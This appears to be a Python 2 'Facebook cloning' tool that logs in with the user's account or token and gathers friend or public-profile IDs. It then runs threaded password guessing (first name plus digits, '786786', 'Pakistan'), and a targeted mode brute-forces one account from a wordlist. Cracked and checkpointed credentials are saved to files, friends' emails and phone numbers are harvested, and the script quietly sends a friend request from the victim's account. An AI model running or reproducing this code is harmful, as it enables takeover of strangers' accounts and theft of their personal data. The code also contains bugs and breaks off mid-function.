#!/usr/bin/python2
#coding=utf-8
#FARIYA KHAN OFFICIAL PROGRAMMER 
#FBCLONING COMMMAD MAKER 
#Fb FARIYA KHAN


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'


#Dev:FARIYA KHAN

##### LOGO #####
logo = """


\033[1;97m______ ___  ______ _______   _____   
\033[1;91m|  ___/ _ \ | ___ \_   _\ \ / / _ \  
\033[1;97m| |_ / /_\ \| |_/ / | |  \ V / /_\ \ 
\033[1;91m|  _||  _  ||    /  | |   \ /|  _  | 
\033[1;97m| |  | | | || |\ \ _| |_  | || | | | 
\033[1;91m\_|  \_| |_/\_| \_|\___/  \_/\_| |_/ 
\033[1;95m       𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳 𝑭𝑨𝑹𝑰𝒀𝑨 𝑲𝑯𝑨𝑵


\033[1;97m------------------------------------------------------

\033[1;96mCREATOR \033[1;91m║──➣\033[1;93m FARIYA KHAN 
\033[1;96mFACEBOOK\033[1;91m║──➣\033[1;93m m.facebook.com/Faritricker007

\033[1;97m------------------------------------------------------
"""

jalan("\033[1;96m♤͜͡♤════✷ FARIYA KHAN OFFICIAL")
jalan("\033[1;96m♤͜͡♤════✷ I M NOT RESPONSIBLE FOR ANY MISS USE")
jalan("\033[1;96m♤͜͡♤════✷ IT IS FOR ONLY EDUCATION PURPOSE")
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m______ ___  ______ _______   _____   
\033[1;91m|  ___/ _ \ | ___ \_   _\ \ / / _ \  
\033[1;97m| |_ / /_\ \| |_/ / | |  \ V / /_\ \ 
\033[1;91m|  _||  _  ||    /  | |   \ /|  _  | 
\033[1;97m| |  | | | || |\ \ _| |_  | || | | | 
\033[1;91m\_|  \_| |_/\_| \_|\___/  \_/\_| |_/ 
\033[1;95m       𝑶𝑭𝑭𝑰𝑪𝑰𝑨𝑳 𝑭𝑨𝑹𝑰𝒀𝑨 𝑲𝑯𝑨𝑵

\033[1;97m------------------------------------------------------

\033[1;96mCREATOR \033[1;91m║──➣\033[1;93m FARIYA KHAN 
\033[1;96mFACEBOOK\033[1;91m║──➣\033[1;93m m.facebook.com/Faritricker007

\033[1;97m------------------------------------------------------
"""

CorrectUsername = "HATERSINMYFOOT"
CorrectPassword = "OWNERFARIYAKHAN"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://m.facebook.com/Faritricker007')
    else:
        print "Wrong Username"
        os.system('xdg-open https://m.facebook.com/Faritricker007')

def login():
	os.system('clear')
	print logo
	print "\033[1;97m ⚔«============================================»⚔"
	print "\033[1;92m[1]\033[1;93m Login With Facebook \033[1;93m(\033[1;93mFacebook Login\033[1;93m) "
	time.sleep(0.05)
	print "\033[1;92m[2]\033[1;91m Login With Access Token \033[1;91m(\033[1;91mLogin With Token\033[1;91m)"
	time.sleep(0.05)
	print "\033[1;92m[3]\033[1;93m Follow Me On Facebook \033[1;93m(\033[1;93mFariya Khan\033[1;93m) "
	time.sleep(0.05)
	print "\033[1;92m[0]\033[1;91m Logout Commands        "
	print "\033[1;97m ⚔«===========================================»⚔"
	pilih_login()
	

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option︻╦╤━╾\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.facebook.com/Faritricker007')
	        login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
		
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		print "\033[1;97m ⚔«============================================»⚔"
		jalan('\033[1;96m[⚡]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[⚡]' )
		jalan('\033[1;96m[⚡]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[⚡]' )
		print "\033[1;97m ⚔«-============================================»⚔"
		print('\033[1;96m[☆] \x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m[☆]' )
		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
		print "\033[1;97m ⚔«-============================================»⚔"
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
				os.system('xdg-open https://www.Facebook.com/Faritricker007')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
def tokenz():
	os.system('clear')
	print logo
	print "\033[1;97m ⚔«-============================================»⚔"
	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;94m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m ⚔«-============================================»⚔"
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "\033[1;97m ⚔«-============================================»⚔"
	print "\033[1;32;98m[1] \033[1;91m 👉 \033[1;91mStart Cloning All Countries"
	time.sleep(0.05)
	print "\033[1;32;98m[2] \033[1;91m 👉 \033[1;96mStart Target Hacking"
	time.sleep(0.05)
	print "\033[1;32;98m[3] \033[1;91m 👉 \033[1;91mExtract Email From ID"
	time.sleep(0.05)
	print "\033[1;32;98m[4] \033[1;91m 👉 \033[1;96mExtract Ph.number From ID"
	time.sleep(0.05)
	print "\033[1;32;98m[5] \033[1;91m 👉 \033[1;91mExtract Numeric ID "
	time.sleep(0.05)
	print "\033[1;32;98m[6] \033[1;91m 👉 \033[1;96mFollow FARIYA Khan On Facebook"
	time.sleep(0.05)
	print "\033[1;32;98m[0] \033[1;91m 👉 \033[1;91mLogout Account"
	print "\033[1;97m ⚔«-============================================»⚔"
	
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
	    hackingx()
	elif unikers =="3":
	    emailx()
	elif unikers =="4":
	    phonex()
	elif unikers =="5":
	    numericx()
	elif unikers =="6":
	    os.system('xdg-open https://m.facebook.com/Faritricker007')
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m ⚔«-============================================»⚔"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	print "\033[1;97m ⚔«-============================================»⚔"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;97m ⚔«-============================================»⚔"
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print "\033[1;97m ⚔«-============================================»⚔"
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[✺] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cracking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;91mTo Stop Process Press CTRL Then Press z')
	print "\033[1;97m ⚔«--------------------------------------------»⚔"
	jalan('   \033[1;93mPlease Wait Cloned Accounts Will Appear Here')
	jalan(' \033[1;91m           Create By : FARIYA KHAN')
	print "\033[1;97m ⚔«--------------------------------------------»⚔"
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass1 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass2 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass3 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass4 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass5 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1234'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass6 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1122'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass7 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																    a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
																    b = json.loads(a.text)
																    pass8 = b['first_name'] + '789'
																    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																    q = json.load(data)
																    if 'access_token' in q:
																        print '\x1b[1;92m[FK-OK]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass8 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
																        oks.append(user+pass8)
																    else:
																        if 'www.facebook.com' in q["error_msg"]:
																            print '\x1b[1;97m[FK-CP]\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + user + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + pass8 + '\x1b[1;91m-\x1b[1;91m⋄\x1b[1;91m-\033[1;97m' + b['name']
																            cek = open("out/checkpoint.txt", "a")
																            cek.write(user+"|"+pass8+"\n")
																            cek.close()
																            cekpoint.append(user+pass8)
																            
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

def hackingx():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        print "\033[1;97m ⚔«--------------------------------------------»⚔"
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;93mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;91m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;96mWordlist \x1b[1;97m(Type👉fariyakhan.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print "\033[1;97m ⚔«--------------------------------------------»⚔"
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            print "\033[1;97m ⚔«--------------------------------------------»⚔"
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print "\033[1;97m ⚔«--------------------------------------------»⚔"
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        time.sleep(0.05)
                        print "\033[1;97m ⚔«--------------------------------------------»⚔"
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print "\033[1;97m ⚔«--------------------------------------------»⚔"
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print "\033[1;97m ⚔«--------------------------------------------»⚔"
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint :('
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mUsername \x1b[1;93m:\x1b[1;92m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;93m:\x1b[1;92m ' + pw
                            print "\033[1;97m ⚔«--------------------------------------------»⚔"
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist correct name"""
            super()

##### EMAIL FROM ID #####
def emailx():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
		print "\033[1;97m ⚔«--------------------------------------------»⚔"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
